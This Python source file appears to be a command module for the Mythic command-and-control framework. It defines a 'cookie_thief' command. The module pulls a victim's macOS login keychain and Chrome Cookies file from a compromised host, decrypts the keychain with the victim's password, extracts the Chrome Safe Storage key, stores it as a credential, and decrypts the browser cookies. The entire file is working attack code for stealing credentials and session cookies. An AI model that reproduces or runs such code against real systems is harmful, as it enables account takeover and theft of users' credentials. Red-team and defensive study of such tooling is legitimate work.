from mythic_payloadtype_container.MythicCommandBase import *
import json
import os
from mythic_payloadtype_container.MythicRPC import *
import traceback
import subprocess
import shutil
from pycookiecheat.pycookiecheat import crisp

class CookieThiefArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "password": CommandParameter(
                name="User Login Password",
                type=ParameterType.String,
                description="p@55w0rd_here for user login",
                required=True,
                ui_position=1
            ),
            "browser": CommandParameter(
                name="Browser",
                type=ParameterType.ChooseOne,
                choices=["chrome"],
                required=False,
                description="choose the browser to steal cookies from",
                default_value="chrome",
                ui_position=2
            ),
            "username": CommandParameter(
                name="Username",
                type=ParameterType.String,
                description="Victim's username from whom to steal the cookies",
                required=True,
                ui_position=3
            ),
        }

    async def parse_arguments(self):
        temp_dict = json.loads(self.command_line)
        for k, v in temp_dict.items():
            for k2, v2 in self.args.items():
                if v2.name == k or k2 ==k:
                    v2.value = v
        # self.load_args_from_json_string(self.command_line)


class CookieThiefCommand(CommandBase):
    cmd = "cookie_thief"
    needs_admin = True
    help_cmd = "cookie_thief {user account password} {browser} {username}"
    description = "Downloads the keychain db and browser cookies, decrypts the keychain, extracts the cookie key and decrypts the cookies."
    version = 1
    #supported_ui_features = ["file_browser:download"] #CHANGE
    author = "@antman"
    parameters = []
    attackmapping = ["T1539", "T1555"]
    argument_class = CookieThiefArguments
    browser_script = BrowserScript(script_name="cookie_thief", author="@antman1p")

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.completed_callback_function = self.downloads_complete
        return task

    async def process_response(self, response: AgentResponse):
        pass

    async def downloads_complete(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
        password = task.args.get_arg("password")
        getkeychainDBResp = await MythicRPC().execute("get_file", task_id=task.id,filename="login.keychain-db", limit_by_callback=True, max_results=1, get_contents=True)
        if getkeychainDBResp.status == "success":
            getkeychainDBResp = getkeychainDBResp.response[0]
        else:
            print("Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
            sys.stdout.flush()

        ## Write the downloaded login.keychain-db file to a new file on disk
        try:
            f = open("tmp_login.keychain-db", "wb")
            f.write(base64.b64decode(getkeychainDBResp["contents"]))
            f.close()
        except Exception as e:
            print("Encountered an error attempting to write the keychainDB to a file: " + str(e))
            sys.stdout.flush()

        ## Decrypt Keychain and export keys to files
        try:
            subprocess.run(["python2", "/Mythic/mythic/chainbreaker/chainbreaker.py", "--password=" + password, "--export-generic-passwords", "tmp_login.keychain-db"])
            await MythicRPC().execute("create_output",task_id=task.id,output="Keychain Decrypted")
        except Exception as e:
            print("Chainbreaker script failed with error: " + str(e))
            sys.stdout.flush()

        ## Remove the login.keychain-db file from disk
        try:
            if os.path.isfile('/Mythic/mythic/tmp_login.keychain-db'):
                os.remove('/Mythic/mythic/tmp_login.keychain-db')
            else:
                print("Temp KeychainDB file does not exist.")
                sys.stdout.flush()
        except Exception as e:
            print("Encountered an error attempting to remove the temporary keychainDB file: " + str(e))
            sys.stdout.flush()


        ## parse the Chrome Safe Storage key from the coresponding keychain password dump file
        fndstr = "Password: "
        ccs_password = ""
        try:
            ccs_keyfile = open("/Mythic/mythic/passwords/generic/ChromeSafeStorage.txt", "r")
        except Exception as e:
            print("Chrome Safe Storage key file failed to open with error: " + str(e))
            sys.stdout.flush()

        for line in ccs_keyfile:
            if fndstr in line:
                ccs_password = line.split(':', 1)[1].strip()
                break

        ccs_keyfile.close()


        ## Remove the keychain password dump directory
        try:
            shutil.rmtree("/Mythic/mythic/passwords")
        except Exception as e:
            print("Failed to delete dumped keys directory with error: " + str(e))
            sys.stdout.flush()

        create_cred_resp = await MythicRPC().execute("create_credential",task_id=task.id,credential_type="plaintext",account="Chrome Safe Storage",realm="local",credential=ccs_password,metadata="",comment="Chrome Safe Storage Key")
        if create_cred_resp.status == MythicStatus.Success:
            await MythicRPC().execute("create_output",task_id=task.id,output="Chrome Safe Storage Key added to credentials")

        ## write the cookies file to a new file on disk
        getCookiesResp = await MythicRPC().execute("get_file", task_id=task.id,filename="Cookies", limit_by_callback=True, max_results=1, get_contents=True)
        if getCookiesResp.status == "success":
            getCookiesResp = getCookiesResp.response[0]
        else:
            print("Encountered an error attempting to get downloaded file: " + getCookiesResp.error)
            sys.stdout.flush()
        try:
            f = open("tmp_Cookies", "wb")
            f.write(base64.b64decode(getCookiesResp["contents"]))
            f.close()
        except Exception as e:
            print("Encountered an error attempting to write the keychainDB to a file: " + str(e))
            sys.stdout.flush()

        cookie_args = {"cookies_file":"/Mythic/mythic/tmp_Cookies", "key":ccs_password, "output":"cookies.json"}

        ## Decrypt Cookies file
        try:
            crisp(cookie_args)
            if os.path.isfile("cookies.json"):
                if os.path.getsize("cookies.json") != 0:
                    await MythicRPC().execute("create_output",task_id=task.id,output="Cookies decrypted")
                    json_file = open("cookies.json", "r")
                    print(json.dumps(json_file, indent=4))
                    json_file.close()
                    await MythicRPC().execute("create_output",task_id=task.id,output="Cookies decrypted")
                else:
                    await MythicRPC().execute("create_output",task_id=task.id,output="No cookies found in Cookies file")
            else:
                await MythicRPC().execute("create_output",task_id=task.id,output="cookie.json file failed on creation")
        except Exception as e:
            print("PyCookieCheat script failed with error: " + str(e))
            sys.stdout.flush()


        # Remove the Cookies file from disk
        try:
            if os.path.isfile('/Mythic/mythic/tmp_Cookies'):
                os.remove('/Mythic/mythic/tmp_Cookies')
            else:
                print("Temp Cookies file does not exist.")
                sys.stdout.flush()
        except Exception as e:
            print("Encountered an error attempting to remove the temporary Cookies file: " + str(e))
            sys.stdout.flush()

        try:
            if os.path.isfile("cookies.json"):
                os.remove("cookies.json")
        except Exception as e:
            print("Encountered an error attempting to remove the cookies.json file: " + str(e))
            sys.stdout.flush()

        return task
